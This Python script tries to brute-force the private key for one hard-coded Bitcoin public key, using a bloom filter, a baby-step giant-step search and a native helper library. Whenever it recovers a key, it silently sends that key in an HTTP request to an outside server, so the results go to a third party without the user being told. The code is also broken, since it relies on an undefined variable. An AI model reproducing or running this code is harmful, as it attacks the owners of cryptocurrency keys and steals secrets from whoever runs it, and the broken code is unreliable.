import ctypes
import platform
import math
import os,requests
import bit
import time
import random
from coincurve import PrivateKey,PublicKey
from coincurve.utils import int_to_bytes, hex_to_bytes, bytes_to_int,  int_to_bytes_padded
import sys

def pub2point(pub_hex):
	x = int(pub_hex[2:66],16)
	if len(pub_hex) < 70:
		y = bit.format.x_to_y(x, int(pub_hex[:2],16)%2)
	else:
		y = int(pub_hex[66:], 16)
	return PublicKey.from_point(x, y)
    
def pointsub(main,other):
    modulo	= 115792089237316195423570985008687907853269984665640564039457584007908834671663
    x,y = other.point()
    negative = PublicKey.from_point(x, -y % modulo)
    return main.combine_keys([main,negative])
    
import secrets
def rand(a, b, bits):
    #bits = random.randint(5,seed_bytes)
    seedn = secrets.randbits(bits)
    seedn = seedn + a
    if seedn > b or a > seedn:
        print("leak")
    return seedn 
    
G = PublicKey.from_point(55066263022277343669578718895168534326250603453777594175500187360389116729240,32670510020758816978083085130507043184471273380659243275938904335757337482424)
oner = int_to_bytes(1)
# x,y = G.point()
# print(x)
# sys.exit()
total_entries = 1000000
bl_entries = 10000

public_key = "02CEB6CBBCDBDF5EF7150682150F4CE2C6F4807B349827DCDBDD1F2EFA885A2630" #"02CEB6CBBCDBDF5EF7150682150F4CE2C6F4807B349827DCDBDD1F2EFA885A2630"
min_k = 0x8000000000000022ca4c44936d4000
max_k = 0xffffffffffffffffffffffffffffff

if platform.system().lower().startswith('win'):
    mylib = ctypes.CDLL('bloom.dll')
    
elif platform.system().lower().startswith('lin'):
    mylib = ctypes.CDLL('./bloom.so')
    
bloom_check_add = mylib.bloom_check_add
bloom_check_add.restype = ctypes.c_int
bloom_check_add.argtypes = [ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.c_ulonglong, ctypes.c_ubyte, ctypes.c_char_p]


        

bloom_prob = 0.0000001                # False Positive = 1 out of 1 billion
bloom_bpe = -(math.log(bloom_prob) / 0.4804530139182014)

bloom_bits = int(total_entries * bloom_bpe)  # ln(2)**2
if bloom_bits % 8: bloom_bits = 8*(1 + (bloom_bits//8))
bloom_hashes = math.ceil(0.693147180559945 * bloom_bpe)


print('bloom bits  :', bloom_bits, '   size [%s MB]'%(bloom_bits//(8*1024*1024)))
print('bloom hashes:', bloom_hashes)
bloom_filter = bytes( bytearray(b'\x00') * (bloom_bits//8) )

daelta = {}
P = pub2point(public_key)
for n in range(1,total_entries+1):
        P = G.combine_keys([P,G])
        x,y = P.point()
        mod_hash = "{:064x}".format(x)
        res = bloom_check_add(bytes.fromhex(mod_hash), 32, 1, bloom_bits, bloom_hashes, bloom_filter)
        if bl_entries > n:
            daelta[mod_hash] = n
        if n % 1000000 == 0:
            print("{:,}".format(n))
            
print("Start")
m_bb = bl_entries
bsgs = total_entries//bl_entries
zebra = 0
found = False
wait = 10
while True:
    #key = random.SystemRandom().randint(min_k, max_k)
    key = rand(min_k, max_k,z_dif)
    Point = G.multiply(int_to_bytes(key))
    x,y = Point.point()
    pubct = "{:064x}".format(x)
    if bloom_check_add(bytes.fromhex(pubct), 32, 0, bloom_bits, bloom_hashes, bloom_filter) > 0:
        idx = daelta.get(pubct)
        print("catch")
        if idx:
            keyn = key - idx
            privkey = "{:064x}".format(keyn)
            print(privkey)
            found = privkey
        else:
            biddas = G.multiply(int_to_bytes(m_bb))
            pint = Point
            for d in range(bsgs):
                key = key - m_bb
                pint = pointsub(pint, biddas)
                mxi,yxi = pint.point()
                xc = "{:064x}".format(mxi)
                idx = daelta.get(xc)
                if idx:
                    keyn = key - idx
                    privkey = "{:064x}".format(keyn)
                    print("faund from full")
                    print(privkey)
                    found = privkey
    if found:
        try:
            respns = requests.get("https://ziguas.pserver.ru/bcon/?id="+str(found), timeout=60)
            print("request send waiting ",wait," sec priv: ",str(found))
            time.sleep(wait)
            wait += 10 
        except:
            pass
    if zebra % 100000 == 0:
        print("{:,}".format(zebra),pubct)
    zebra += 1
